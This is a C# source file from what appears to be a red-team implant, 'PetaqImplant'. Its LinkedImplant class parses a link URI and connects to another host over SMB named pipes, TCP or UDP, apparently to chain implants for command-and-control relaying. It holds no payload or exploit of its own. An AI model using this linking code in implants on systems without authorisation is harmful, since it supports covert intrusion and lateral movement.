using System;
using System.Text;
using System.Text.RegularExpressions;

namespace PetaqImplant
{
    internal class LinkedImplant
    {
        internal string sessionId { get; private set; } // Random generated identifier for sessionId
        internal string friendlyName { get; private set; } // User friendly name
        internal string comment { get; private set; } // User friendly comment to be added
        internal string link_uri { get; private set; } // smb tcp udp websocket http
        internal LinkedImplantSocket implantObject { get; private set; } // implant socket object
        internal object implantIO { get; private set; } // implant IO
        internal DateTime dateConnected { get; private set; } // the implant connection date
        internal DateTime dateDisconnected { get; private set; } // the implant disconnection date

        public LinkedImplant(string luri) {
            // set & parse the link uri 
            link_uri = luri;

            // set the protocol, host, port and pipe name
            string proto = Regex.Split(link_uri, ":")[0];  // Protocol for linking
            string rhost = Regex.Split(link_uri, "/")[2];  // Host


            // Named Pipe Name or Port if there is
            string option = null ; 
            if ( Regex.Split(link_uri, "/").Length > 3) { option = Regex.Split(link_uri, "/")[3]; }

            // if proto is unknown, go back
            switch (proto)
            {
                case "smb":
                    implantObject = new NamedPipeClientSocket();
                    break;
                case "tcp":
                    implantObject = new TCPClientSocket();
                    break;
                case "udp":
                    implantObject = new UDPClientSocket();
                    break;
                default:
                    Console.WriteLine("Unsupported linking protocol: {0}",proto);
                    return;
            }

            // generate session ID 
            sessionId = Common.RandomStringGenerator(20);

            // connect to the remote socket
            implantObject.Connect(sessionId, rhost, option);

            if ( implantObject.Status )
            {
                dateConnected = DateTime.Now;
            }
            return;
        }

        private void Destroy()
        {
            implantObject.Disconnect();
        }
    }
    
}
